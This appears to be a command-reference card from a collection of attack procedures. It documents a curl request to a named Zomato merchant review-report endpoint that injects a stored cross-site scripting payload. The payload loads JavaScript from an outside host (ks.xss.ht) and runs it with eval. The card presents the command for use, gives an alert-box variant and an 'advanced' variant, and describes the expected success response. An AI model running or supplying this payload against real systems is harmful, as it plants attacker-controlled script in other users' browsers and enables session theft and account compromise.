---
data: >-
  curl -X POST 'https://www.zomato.com/api/v2/merchant/report_review' -H
  'X-Access-Token: YOUR_VALID_TOKEN' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'reason_id=5&review_id=32288944&additional_text=<script>function
  b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",
  b);a.open("GET", "//ks.xss.ht");a.send();</script>'
tags:
  - xss
  - http
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:39.055Z'
id: 268393cd-a57b-4982-b5cd-4e32cfd2534e
verified: false
validated: true
submitted: true
---
# curl-send-xss-report

## Command

```bash
curl -X POST 'https://www.zomato.com/api/v2/merchant/report_review' \
  -H 'X-Access-Token: YOUR_VALID_TOKEN' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>'
```

## Description

This command sends a POST request to the Zomato review reporting endpoint, injecting a stored XSS payload into the additional_text parameter to exploit unsanitized input storage. Use it to simulate the attack without Burp Suite.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H 'X-Access-Token: ...'` | Authentication header with valid token | Yes |
| `-d '...' ` | Form data including reason_id, review_id, and malicious additional_text | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.zomato.com/api/v2/merchant/report_review' -H 'X-Access-Token: token' -d 'reason_id=5&review_id=32288944&additional_text=<script>alert(1)</script>'
```

### Advanced Usage

```bash
curl -X POST 'https://www.zomato.com/api/v2/merchant/report_review' \
  -H 'X-Access-Token: token' \
  -H 'User-Agent: Mozilla/5.0' \
  -d 'reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>' -v
```

## Expected Output

HTTP/1.1 200 OK response with JSON like {"status":"success","report_id":123}, indicating the report and payload were stored.

## Related

- [[Related Procedure: Send-Review-Report-Request-with-Burp-Suite]]
